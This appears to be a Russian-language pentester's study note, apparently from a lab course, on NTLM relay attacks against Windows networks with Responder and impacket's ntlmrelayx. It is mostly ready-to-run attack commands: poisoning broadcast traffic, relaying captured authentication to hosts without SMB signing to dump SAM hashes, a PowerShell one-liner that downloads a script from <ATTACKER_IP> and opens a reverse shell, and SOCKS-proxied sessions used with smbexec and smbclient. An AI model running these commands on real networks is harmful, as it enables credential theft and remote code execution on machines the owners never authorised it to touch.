#tool #impacket #relay #ntlm #windows 

####  При использовании ntlmrelayx необходимо отключить прослушку необходимых протоколов на Respondere (SMB/HTTP)


Это связано с тем, что `ntlmrelayx` запускает `SMB`- или `HTTP`-сервер, чтобы он мог ретранслировать соединение от клиентов к серверу, и если `Responder` запускает эти службы, мы не сможем использовать `ntlmrelayx`, так как порт будет уже занят
```bash
sed -i "s/SMB = On/SMB = Off/" Responder.conf

sed -i "s/HTTP = On/HTTP = Off/" Responder.conf
```

# 1) NTLMRelay через SMB 

1) Файл хостов без SMB signing
relayTargets.txt
```
172.16.117.50 
172.16.117.60
```
**`relayTargets.txt` — это список хостов, на которых `ntlmrelayx` попытается** аутентифицироваться

2) Запускаем Respnder в режиме отравления
```bash
sudo python3 Responder.py -I ens192
```
Сам он не перенаправляет, а только отдает результаты аутентификации на порт, который слушает ntlmrelayx

3.1) Используем ntlmrelayx для **SAM dump**
```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support
```
ntlmrelayx уже перенаправляет данные аутентификации на relayTargets и пытается на них аутентифицировать жертву

По умолчанию ntlmrelayx будет аутентифицировать нас по SMB и если аутентификация выполнится успешно от выполнит **SAM dump** и в случае, если учетка была local admin, то он выполнится, иначе нет

> Если атака не сработала - необходимо перезагрузить

![[Use Poisonig and Relay.png]]


3.2) Используем ntlmrelayx для **Выполнения команд**

> -c "Command To Execute"

Как только `Responder` перехватит широковещательный трафик, мы увидим, что `ntlmrelayx` передал `NTLM` аутентификацию юзера от 172.16.117.3 и установил сеанс аутентификации на 172.16.117.50; затем он использовал этот сеанс аутентификации как юзер и выполнил команду, например для получения шелла

1 терминал
```bash
sudo python3 Responder.py -I ens192
```

2 терминал
```bash
nc -lvnp 4444
```

3 терминал
```bash
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1 -q 

python3 -m http.server 8888
```

4 терминал
```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<ATTACKER_IP>:8888/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444"
```

# 2) Multy-Relay

> Мультирелей используется для проведение аутентификаций на множестве целей. Получается связь  N:M (Многий ко многим): Каждая новая попытка аутентификации запускает несколько попыток релея

Цели могут быть либо `named targets`, либо `general targets`
- `named targets` — это цели с указанной идентичностью
- `general targets` — цели без идентичности

`named targets` - `172.16.117.5`  or `smb://172.16.117.5` 
`general targets` - `smb://INLANEFREIGHT\\PETER@172.16.117.5`

| **Тип цели**            | **Пример**                                    | **Статус мультиретрансляции по умолчанию** |
| :---------------------- | :-------------------------------------------- | :----------------------------------------- |
| `Single General Target` | `-t 172.16.117.50`                            | `Disabled`                                 |
| `Single Named Target`   | `-t smb://INLANEFREIGHT\\PETER@172.16.117.50` | `Enabled`                                  |
| `Multiple Targets`      | `-tf relayTargets.txt`                        | `Enabled`                                  |
### Отключение Multy-Relay

Если мы хотим использовать тот же `named target` `smb://INLANEFREIGHT\\PETER@172.16.117.50`, но хотим, чтобы только первое соединение `ntlmrelayx` могло быть ретранслятором для пользователя `INLANEFREIGHT\PETER`; для этого мы можем отключить `multi-relay` с помощью опции `--no-multirelay`:
```bash
ntlmrelayx.py -t smb://INLANEFREIGHT\\PETER@172.16.117.50 --no-multirelay
```

# 3) Использование SOCKS proxy ( -socks )

> Используется для хранения и поддержания аутентифицированных сессий для дальнейшего их применения

Подняв все соединения на этом прокси, через проксификатор мы можем к ним обратиться именно на тот адрес, который нам нужно

Просмотр активных сессий
```bash
ntlmrelayx> socks 
Protocol             Target        Username         AdminStatus      Port 
-------- ------------- ------------------ ------------------ ------------------
SMB              172.16.117.50  INLANEFREIGHT/RMONTY FALSE            445 
SMB              172.16.117.50  INLANEFREIGHT/PETER   TRUE            445 
SMB              172.16.117.50  INLANEFREIGHT/NPORTS FALSE            445 
```

### Использование proxychains

1) Запуск в режиме захвата соединений
```bash
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -socks
```

2) Запуск спуфинга
```bash
sudo python3 Responder.py -I ens192
```

3.1) Использование инструмента (Если **есть** Admin Status)
```bash
proxychains4 -q smbexec.py INLANEFREIGHT/PETER@172.16.117.50 -no-pass
```

3.2) Просмотр общих шар (Если **НЕТ** Admin Status)
```bash
proxychains4 -q smbclient.py INLANEFREIGHT/RMONTY@172.16.117.50 -no-pass
```


# 4) Интерактивный режим ( -i )

> Открывается локальный порт для каждой оболочки и можем начать ею пользоваться через netcat, однако теряется после закрытия  (Не обеспечиае постоянство, как socks)

```bash
ntlmrelayx.py -tf relayTargets.txt -smb2support -i
```

```bash
nc -nv 127.0.0.1 11000
```